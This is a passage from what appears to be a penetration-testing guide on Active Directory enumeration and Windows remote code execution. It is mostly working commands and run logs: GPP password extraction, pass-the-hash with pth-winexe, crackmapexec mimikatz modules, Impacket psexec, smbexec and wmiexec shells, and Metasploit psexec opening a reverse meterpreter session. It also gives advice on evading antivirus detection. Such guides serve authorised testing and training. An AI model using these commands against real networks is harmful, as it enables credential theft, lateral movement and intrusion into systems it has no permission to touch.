<div><div class="highlight-None"><div class="highlight"><pre><span></span>$ds.filter = &quot;(&amp;(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=bitvijays,dc=local))&quot;
</pre></div>
</div>
</div></blockquote>
</div>
</div>
<div class="section" id="get-sessions-of-remote-machines">
<h3>Get sessions of remote machines<a class="headerlink" href="#get-sessions-of-remote-machines" title="Permalink to this headline">¶</a></h3>
<div class="section" id="powerview-get-netsession">
<h4>Powerview Get-NetSession<a class="headerlink" href="#powerview-get-netsession" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="net-session">
<h4>net session<a class="headerlink" href="#net-session" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Net session of current computer</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>net session

Computer               User name            Client Type       Opens Idle time

-------------------------------------------------------------------------------
\\127.0.0.1            Administrat0r                              1 05D 22H 02M

The command completed successfully.
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Net session of remote computer</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>net session \\computername
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="wmi">
<h4>WMI<a class="headerlink" href="#wmi" title="Permalink to this headline">¶</a></h4>
<p>We can use wmi to get the remote logged on users. However, I believe to run wmi on remote machine, you need to be administrator of that machine.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>wmic:root\cli&gt; /node:&quot;computername&quot; path win32_loggeduser get antecedent

\\.\root\cimv2:Win32_Account.Domain=&quot;ABCROOT&quot;,Name=&quot;axx.xxxxx&quot;
\\.\root\cimv2:Win32_Account.Domain=&quot;ABCROOT&quot;,Name=&quot;srv.xxxxx&quot;
\\.\root\cimv2:Win32_Account.Domain=&quot;ABCROOT&quot;,Name=&quot;axx.xxxxx&quot;
\\.\root\cimv2:Win32_Account.Domain=&quot;MA&quot;,Name=&quot;axxd.xxxxx&quot;
\\.\root\cimv2:Win32_Account.Domain=&quot;DC&quot;,Name=&quot;ANONYMOUS LOGON&quot;
</pre></div>
</div>
</div>
</div>
<div class="section" id="view-users-in-domain-workgroup">
<h3>View users in Domain / Workgroup<a class="headerlink" href="#view-users-in-domain-workgroup" title="Permalink to this headline">¶</a></h3>
<div class="section" id="powerview-get-netuser">
<h4>Powerview Get-NetUser<a class="headerlink" href="#powerview-get-netuser" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="net-user-domain">
<h4>net user /domain<a class="headerlink" href="#net-user-domain" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="id9">
<h4>WMI<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
<p>Domain users:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>wmic useraccount list /format:list
</pre></div>
</div>
</div>
</div>
<div class="section" id="view-machines-in-domain-workgroup">
<h3>View machines in Domain/ Workgroup<a class="headerlink" href="#view-machines-in-domain-workgroup" title="Permalink to this headline">¶</a></h3>
<div class="section" id="powerview-get-netcomputers">
<h4>Powerview Get-NetComputers<a class="headerlink" href="#powerview-get-netcomputers" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="net-view-domain">
<h4>net view /domain<a class="headerlink" href="#net-view-domain" title="Permalink to this headline">¶</a></h4>
<p>? – check the functionality</p>
</div>
<div class="section" id="view-machines-affected-by-gpp-vulnerability">
<h4>View machines affected by GPP vulnerability<a class="headerlink" href="#view-machines-affected-by-gpp-vulnerability" title="Permalink to this headline">¶</a></h4>
<p>When we run Get-GPPPassword, we get output like</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Password: password@123
Changed : 2013-07-02 01:01:23
Username: Administrator
NewName :
File    : \\Demo.lab\sysvol\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\{DataSouces| Groups| ScheduledTasks.xml
</pre></div>
</div>
<p>To get the computers using the passwords set by the GPP, we can use</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Get-NetOU -GUID &quot;{31B2F340-016D-11D2-945F-00C04FB984F9}&quot; | %{ Get-NetComputer -ADSPath $_ }
</pre></div>
</div>
<p>Get-NetSite function, which returns the current sites for a domain, also accepts the -GUID filtering flag. This information has been taken from harmj0y blog <a class="reference external" href="http://www.harmj0y.net/blog/powershell/gpp-and-powerview/">gpp and powerview</a></p>
<p>More information about GPP should be read from Sean Metcalf blog <a class="reference external" href="https://adsecurity.org/?p=384">Using Group Policy Preferences for Password Management = Bad Idea</a> and <a class="reference external" href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></p>
<p>There are various methods to figure out the GPP Password if it’s set.</p>
<ul class="simple">
<li><a class="reference external" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a> :  <strong>PowerShell script</strong> that can identify and extract the password(s) stored in Group Policy Preferences using the MSDN AES key.</li>
<li><strong>Metasploit auxiliary module - SMB Group Policy Preference Saved Passwords Enumeration</strong> :  This module enumerates files from target domain controllers and connects to them via SMB. It then looks for Group Policy Preference XML files containing local/domain user accounts and passwords and decrypts them using Microsoft’s public AES key. This module has been tested successfully on a Win2k8 R2 Domain Controller. ( Requires domain user credentials)</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>use auxiliary/scanner/smb/smb_enum_gpp
set smbdomain example.com
set smbuser user
set smbpass pass
set rhosts 192.168.56.2
</pre></div>
</div>
<p>Thanks to Tanoy Bose for informing about this!. Previously, we used to manually search the SYSVOL location! ( When for some reason Get-GPPPassword doesn’t work! )</p>
</div></blockquote>
<ul class="simple">
<li><strong>Meterpreter session</strong>, we can use metasploit post module - Windows Gather Group Policy Preference Saved Passwords : This module enumerates the victim machine’s domain controller and connects to it via SMB. It then looks for Group Policy Preference XML files containing local user accounts and passwords and decrypts them using Microsoft’s public AES key. Cached Group Policy files may be found on end-user devices if the group policy object is deleted rather than unlinked.</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>use post/windows/gather/credentials/gpp
set session &lt;Session_Number&gt;
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><strong>Reading Group Policies</strong> manually stored here: \&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</li>
</ul>
</div>
</div>
<div class="section" id="view-group-in-domain-workgroup">
<h3>View group in Domain / Workgroup<a class="headerlink" href="#view-group-in-domain-workgroup" title="Permalink to this headline">¶</a></h3>
<div class="section" id="powerview-get-netgroupmember">
<h4>Powerview Get-NetGroupMember<a class="headerlink" href="#powerview-get-netgroupmember" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="net-group-domain">
<h4>Net group / domain<a class="headerlink" href="#net-group-domain" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="windows-resource-kit-local-global-executable">
<h4>Windows Resource Kit Local/ Global executable<a class="headerlink" href="#windows-resource-kit-local-global-executable" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Global.exe</li>
</ul>
<blockquote>
<div><div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; .\global.exe

Displays members of global groups on remote servers or domains.

GLOBAL group_name domain_name | \\server

group_name    The name of the global group to list the members of.
domain_name   The name of a network domain.
\\server      The name of a network server.

Examples:
Global &quot;Domain Users&quot; EastCoast
Displays the members of the group &#39;Domain Users&#39; in the EastCoast domain.

Global PrintUsers \\BLACKCAT
Displays the members of the group PrintUsers on server BLACKCAT.

Notes:
Names that include space characters must be enclosed in double quotes.
To list members of local groups use Local.Exe.
To get the Server name for a give Domain use GetDC.Exe.
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>PS C:\&gt; .\global.exe &quot;Domain Admins&quot; \\domainname
Uraxxxx
axx.xxxxx
axx.xxxxx2
axx.xxxxxx3
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="bloodhound-group-memberships">
<h4>BloodHound Group Memberships<a class="headerlink" href="#bloodhound-group-memberships" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="wmi-user-groups">
<h4>WMI user groups<a class="headerlink" href="#wmi-user-groups" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>wmic group list brief
ABCD\SUS Administrator    ABCD          SUS Administrator                                         S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-7357
ABCD\VPN Admins           ABCD          VPN Admins                                                S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-8728
ABCD\VPN Users            ABCD          VPN Users                                                 S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-9229
ABCD\XXX - OER Users      ABCD          XXX - OER Users                                           S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-5095
</pre></div>
</div>
</div>
</div>
<div class="section" id="hunting-for-a-particular-user">
<h3>Hunting for a particular User?<a class="headerlink" href="#hunting-for-a-particular-user" title="Permalink to this headline">¶</a></h3>
<div class="section" id="powerview-invoke-userhunter">
<h4>Powerview Invoke-UserHunter<a class="headerlink" href="#powerview-invoke-userhunter" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="bloodhound-users-sessions">
<h4>BloodHound users_sessions<a class="headerlink" href="#bloodhound-users-sessions" title="Permalink to this headline">¶</a></h4>
</div>
<div class="section" id="eventlog-ad">
<h4>EventLog AD?<a class="headerlink" href="#eventlog-ad" title="Permalink to this headline">¶</a></h4>
<p>How? Not yet successful!</p>
</div>
</div>
</div>
<div class="section" id="remote-code-execution-methods">
<span id="id10"></span><h2>Remote Code Execution Methods<a class="headerlink" href="#remote-code-execution-methods" title="Permalink to this headline">¶</a></h2>
<p>A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">Part 1: Using credentials to own windows boxes</a> , <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/">Part2: PSExec and Services</a> and <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part: 3 Wmi and WinRM</a> and by scriptjunkie in his blog <a class="reference external" href="https://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/">Authenticated Remote Code Execution Methods in Windows</a></p>
<p>We have just summarized all in one page with <em>working</em> examples wherever possible.</p>
<div class="section" id="winexe">
<h3>Winexe<a class="headerlink" href="#winexe" title="Permalink to this headline">¶</a></h3>
<div class="section" id="linux-binary-pth-winexe">
<h4>Linux Binary pth-winexe<a class="headerlink" href="#linux-binary-pth-winexe" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>winexe version 1.1
Usage: winexe [OPTION]... //HOST COMMAND
Options:
 -h, --help                                  Display help message
 -V, --version                               Display version number
 -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
 -A, --authentication-file=FILE              Get the credentials from a file
 -N, --no-pass                               Do not ask for a password
 -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
 -d, --debuglevel=DEBUGLEVEL                 Set debug level
     --uninstall                             Uninstall winexe service after remote execution
     --reinstall                             Reinstall winexe service before remote execution
     --system                                Use SYSTEM account
     --profile                               Load user profile
     --convert                               Try to convert characters between local and remote code-pages
     --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)
     --runas-file=FILE                       Run as user options defined in a file
     --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.
     --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.
</pre></div>
</div>
<p>Example with pth:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:4b579a266f697c2xxxxxxxxx //10.145.X.X cmd.exe
pth-winexe -U EXAMPLE/Administrator%example@123 //10.145.X.X cmd.exe
</pre></div>
</div>
<p>If we want to login as NTAuthority, probably use –system. (Helpful when we to run commands as NTAuthority such as installing ssh server host keys)</p>
</div>
<div class="section" id="windows-binary-win-exe">
<h4>Windows Binary win-exe<a class="headerlink" href="#windows-binary-win-exe" title="Permalink to this headline">¶</a></h4>
<p>win-exe can be downloaded from <a class="reference external" href="https://sourceforge.net/projects/winexe/">winexe</a></p>
<p>commands and usage is same as linux binary pth-winexe. However, it needed to be compiled from the source.</p>
</div>
</div>
<div class="section" id="crackmapexec">
<h3>crackmapexec<a class="headerlink" href="#crackmapexec" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> is quite awesome tool when it comes to remote command execution. Read the <a class="reference external" href="https://github.com/byt3bl33d3r/CrackMapExec/wiki">wiki</a></p>
<div class="section" id="id13">
<h4>Usage<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>positional arguments:
target                The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of targets

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program&#39;s version number and exit
  -t THREADS            Set how many concurrent threads to use (default: 100)
  -u USERNAME [USERNAME ...]  Username(s) or file(s) containing usernames
  -d DOMAIN             Domain name
  --local-auth          Authenticate locally to each target
  -p PASSWORD [PASSWORD ...]  Password(s) or file(s) containing passwords
  -H HASH [HASH ...]    NTLM hash(es) or file(s) containing NTLM hashes
  -M MODULE, --module MODULE Payload module to use
  -MC CHAIN_COMMAND, --module-chain CHAIN_COMMAND  Payload module chain command string to run
  -o MODULE_OPTION [MODULE_OPTION ...] Payload module options
  -L, --list-modules    List available modules
  --show-options        Display module options
  --verbose             Enable verbose output

Credential Gathering:
Options for gathering credentials

--sam                 Dump SAM hashes from target systems
--lsa                 Dump LSA secrets from target systems
--ntds {vss,drsuapi}  Dump the NTDS.dit from target DCs using the specified method
                      (drsuapi is the fastest)
--ntds-history        Dump NTDS.dit password history
--ntds-pwdLastSet     Shows the pwdLastSet attribute for each NTDS.dit account
--wdigest {enable,disable}
                      Creates/Deletes the &#39;UseLogonCredential&#39; registry key enabling WDigest cred dumping on Windows &gt;= 8.1
Mapping/Enumeration:
Options for Mapping/Enumerating

--shares              Enumerate shares and access
--uac                 Checks UAC status
--sessions            Enumerate active sessions
--disks               Enumerate disks
--users               Enumerate users
--rid-brute [MAX_RID]
                      Enumerate users by bruteforcing RID&#39;s (default: 4000)
--pass-pol            Dump password policy
--lusers              Enumerate logged on users
--wmi QUERY           Issues the specified WMI query
--wmi-namespace NAMESPACE
                      WMI Namespace (default: //./root/cimv2)

Command Execution:
Options for executing commands

--exec-method {smbexec,wmiexec,atexec}
                      Method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
--force-ps32          Force the PowerShell command to run in a 32-bit process
--no-output           Do not retrieve command output
-x COMMAND            Execute the specified command
-X PS_COMMAND         Execute the specified PowerShell command
</pre></div>
</div>
</div>
<div class="section" id="modules">
<h4>Modules<a class="headerlink" href="#modules" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>crackmapexec smb -L

[*] empire_exec               Uses Empire&#39;s RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] netripper                 Capture&#39;s credentials by using API hooking
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] rdp                       Enables/Disables RDP
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the &#39;UseLogonCredential&#39; registry key enabling WDigest cred dumping on Windows &gt;= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
</pre></div>
</div>
<p>Using a module</p>
<p>Simply specify the module name with the -M flag:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -M mimikatz
06-05-2016 14:13:59 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
</pre></div>
</div>
<p>Use the -M flag to specify the module and the –options argument to view the module’s supported options:</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>#~ crackmapexec -M mimikatz --options
06-05-2016 14:10:33 [*] mimikatz module options:
COMMAND Mimikatz command to execute (default: &#39;sekurlsa::logonpasswords&#39;)
</pre></div>
</div>
<p>Using module options
Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -M mimikatz -o COMMAND=privilege::debug
</pre></div>
</div>
</div>
</div>
<div class="section" id="smbmap">
<h3>Smbmap<a class="headerlink" href="#smbmap" title="Permalink to this headline">¶</a></h3>
<p>smbmap an inbuilt tool in kali linux which gives some awesome results while gathering information related to the shares associated to with a particular user. As compared to the crackmapexec we can also use smbmap in order to verify the credentials gathered. This can not only be used to map the shares but can also be used for running remote commands by specifying the ‘-x’ flag.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>smbmap -H 192.168.4.32 -d ABC.com -u Administrat0r -p P@ssw0rd!
[+] Finding open SMB ports....
[+] User SMB session established on 192.168.4.32...
[+] IP: 10.7.3.2:445  Name: dcrs.ABC.com
      Disk                                                    Permissions
      ----                                                    -----------
      ADMIN$                                                  READ, WRITE
      C$                                                      READ, WRITE
      IPC$                                                    READ ONLY
      NETLOGON                                                READ, WRITE
      SYSVOL                                                  READ, WRITE
      [!] Unable to remove test directory at \\192.168.4.32\SYSVOL\BiZyIseFGv, please remove manually.
</pre></div>
</div>
</div>
<div class="section" id="impacket-psexec-smbexe-wmiexec">
<h3>Impacket psexec/ smbexe/ wmiexec<a class="headerlink" href="#impacket-psexec-smbexe-wmiexec" title="Permalink to this headline">¶</a></h3>
<div class="section" id="impacket-psexec">
<h4>Impacket psexec<a class="headerlink" href="#impacket-psexec" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>./psexec.py -debug Admini:Password@10.0.X.X

Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies

[*] Trying protocol 445/SMB...
[*] Requesting shares on 10.0.5.180.....
[*] Found writable share ADMIN$
[*] Uploading file kBibbkKL.exe
[*] Opening SVCManager on 10.0.5.180.....
[*] Creating service cvZN on 10.0.5.180.....
[*] Starting service cvZN.....
[-] Pipe not ready, aborting
[*] Opening SVCManager on 10.0.5.180.....
[*] Stoping service cvZN.....
[*] Removing service cvZN.....
[*] Removing file kBibbkKL.exe.....
</pre></div>
</div>
</div>
<div class="section" id="impacket-smbexec">
<h4>Impacket smbexec<a class="headerlink" href="#impacket-smbexec" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>./smbexec.py -debug Admini:Password@10.0.5.180

Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies

[+] StringBinding ncacn_np:10.0.5.180[\pipe\svcctl]
[+] Executing %COMSPEC% /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32&gt;ipconfig
[+] Executing %COMSPEC% /Q /c echo ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat

Windows IP Configuration


Ethernet adapter Local Area Connection:

Connection-specific DNS Suffix  . :
Link-local IPv6 Address . . . . . : fe80::4546:b672:307:b488%10
IPv4 Address. . . . . . . . . . . : 10.0.X.XX
Subnet Mask . . . . . . . . . . . : 255.255.254.0
Default Gateway . . . . . . . . . : 10.0.X.1

Tunnel adapter isatap.{EB92DEE7-521B-4E14-84C2-0E9B9E96563E}:

Media State . . . . . . . . . . . : Media disconnected
Connection-specific DNS Suffix  . :

Tunnel adapter Local Area Connection* 11:

Media State . . . . . . . . . . . : Media disconnected
Connection-specific DNS Suffix  . :

C:\Windows\system32&gt;
</pre></div>
</div>
</div>
<div class="section" id="impacket-wmiexec">
<h4>Impacket wmiexec<a class="headerlink" href="#impacket-wmiexec" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]
                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                  [-dc-ip ip address]
                  target [command [command ...]]

Executes a semi-interactive shell using Windows Management Instrumentation.

positional arguments:
  target                [[domain/]username[:password]@]&lt;targetName or address&gt;
  command               command to execute at the target. If empty it will
                        launch a semi-interactive shell

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don&#39;t ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
</pre></div>
</div>
<p><strong>Example with password</strong></p>
<div class="highlight-None"><div class="highlight"><pre><span></span>wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180

Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] SMBv2.1 dialect used
[+] Target system is 10.0.5.180 and isFDQN is False
[+] StringBinding: \\\\xxxxHBKS1739[\\PIPE\\atsvc]
[+] StringBinding: xxxxhbks1739[49155]
[+] StringBinding: 10.0.5.180[49155]
[+] StringBinding chosen: ncacn_ip_tcp:10.0.5.180[49155]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;hostname
xxxxhbks1739

C:\&gt;whoami
xxxxhbks1739\administrat0r

C:\&gt;
</pre></div>
</div>
<p><strong>Example with hashes</strong></p>
<div class="highlight-None"><div class="highlight"><pre><span></span>wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  Administrat0r@10.0.5.180
</pre></div>
</div>
</div>
</div>
<div class="section" id="metasploit-psexec">
<h3>Metasploit psexec<a class="headerlink" href="#metasploit-psexec" title="Permalink to this headline">¶</a></h3>
<p>Metasploit psexec have three methods to invoke,</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>msf exploit(psexec) &gt; show targets

Exploit targets:

Id  Name
--  ----
 0   Automatic
 1   PowerShell
 2   Native upload
 3   MOF upload
</pre></div>
</div>
<div class="section" id="target-2-native-upload">
<h4>Target 2: Native upload<a class="headerlink" href="#target-2-native-upload" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>msf exploit(psexec) &gt; set target 2
target =&gt; 2

[*] Started reverse TCP handler on 10.11.43.116:4444
[*] 10.0.5.180:445 - Connecting to the server...
[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...
[*] 10.0.5.180:445 - Uploading payload...
[*] 10.0.5.180:445 - Created \hnFrgUVk.exe...
[-] 10.0.5.180:445 - Service failed to start - ACCESS_DENIED
[*] 10.0.5.180:445 - Deleting \hnFrgUVk.exe...
[*] Exploit completed, but no session was created.
</pre></div>
</div>
<p>We can see that the exploit was completed however, no session was created. Also the antivirus provided an alert.</p>
<div class="highlight-None"><div class="highlight"><pre><span></span>Datei &quot;C:\Windows\hnFrgUVk.exe&quot; belongs to virus/spyware &#39;Troj/Swrort-K&#39;.
</pre></div>
</div>
<p>Let’s try with</p>
</div>
<div class="section" id="target-1-powershell">
<h4>Target 1, powershell<a class="headerlink" href="#target-1-powershell" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>msf exploit(psexec) &gt; set smbdomain .
smbdomain =&gt; .
msf exploit(psexec) &gt; set smbuser Administrat0r
smbuser =&gt; Administrat0r
msf exploit(psexec) &gt; set smbpass Passw0rd!!
smbpass =&gt; Passw0rd!!
msf exploit(psexec) &gt; set rhost 10.0.5.180
rhost =&gt; 10.0.5.180
msf exploit(psexec) &gt; run

[*] Started reverse TCP handler on 10.11.43.116:4444
[*] 10.0.5.180:445 - Connecting to the server...
[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...
[*] 10.0.5.180:445 - Selecting PowerShell target
[*] 10.0.5.180:445 - Executing the payload...
[+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf exploit(psexec) &gt; run

[*] Started reverse TCP handler on 10.11.43.116:4444
[*] 10.0.5.180:445 - Connecting to the server...
[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...
[*] 10.0.5.180:445 - Selecting PowerShell target
[*] 10.0.5.180:445 - Executing the payload...
[+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (957487 bytes) to 10.0.5.180
[*] Meterpreter session 1 opened (10.11.43.116:4444 -&gt; 10.0.5.180:64783) at 2017-02-20 16:31:41 +0530

meterpreter &gt;
</pre></div>
</div>
<p>Let’s try also with</p>
</div>
<div class="section" id="target-3-mof-upload">
<h4>Target 3: MOF Upload<a class="headerlink" href="#target-3-mof-upload" title="Permalink to this headline">¶</a></h4>
<div class="highlight-None"><div class="highlight"><pre><span></span>msf exploit(psexec) &gt; set target 3
target =&gt; 3

[*] Started reverse TCP handler on 10.11.43.116:4444
[*] 10.0.5.180:445 - Connecting to the server...
[*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user &#39;Administrat0r&#39;...
[*] 10.0.5.180:445 - Trying wbemexec...
[*] 10.0.5.180:445 - Uploading Payload...
[*] 10.0.5.180:445 - Created %SystemRoot%\system32\KiaHTgBg.exe
[*] 10.0.5.180:445 - Uploading MOF...
[*] 10.0.5.180:445 - Created %SystemRoot%\system32\wbem\mof\5SZ1WZENmHyays.MOF
[*] Exploit completed, but no session was created.
</pre></div>
</div>
</div>
<div class="section" id="working-of-msf-psexec-native-upload">
<h4>Working of MSF PSexec - Native Upload<a class="headerlink" href="#working-of-msf-psexec-native-upload" title="Permalink to this headline">¶</a></h4>
<p>Jonathan has already written awesome detailed blog <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a> Working of MSF PSExec has been taken from his blog directly.</p>
<p>While similar in functionality to Sysinternal’s PsExec, the Metasploit Framework’s PSExec Module has a few key differences and at a high-level performs the following actions.  By default, the module takes the following actions:</p>
<ul class="simple">
<li>Creates a randomly-named service executable with an embedded payload</li>
<li>Connects to the hidden ADMIN$ share on the remote system via SMB</li>
<li>Drops malicious service executable onto the share</li>
<li>Utilizes the SCM to start a randomly-named service</li>
<li>Service loads the malicious code into memory and executes it</li>
<li>Metasploit payload handler receives payload and establishes session</li>
<li>Module cleans up after itself, stopping the service and deleting the executable</li>
</ul>
<p>There is more flexibility with the Metasploit’s PSExec in comparison to Microsoft’s tool.  For instance, the default location of the malicious service executable can be modified from the hidden ADMIN$ to C$ or even another shared folder on the target machine.  Names of the service executable and associated service can also be changed under the module’s Advanced settings.</p>
<p>However, the most important modification that a penetration tester can make is creating and linking to a custom service executable instead of relying on the executable templates provided by the Metasploit Framework.  Failure to do so greatly increases the risk of detection by the target system’s anti-virus solution once the executable is dropped to disk.</p>
</div>
<div class="section" id="working-of-msf-psexec-powershell">
<h4>Working of MSF PSExec - Powershell<a class="headerlink" href="#working-of-msf-psexec-powershell" title="Permalink to this headline">¶</a></h4>
<p>Details taken directly from Jonathan blog <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a></p>
<p>At a high-level, the psexec_psh module works as follows:</p>
<ul class="simple">
<li>Embed stager into a PowerShell script that will inject the payload into memory</li>
<li>Compress and Base64 encode the PowerShell script</li>
<li>Wrap encoded script into a PowerShell one-liner that decodes and deflates</li>
<li>Connect to ADMIN$ share on target machine over SMB and run the one-liner</li>
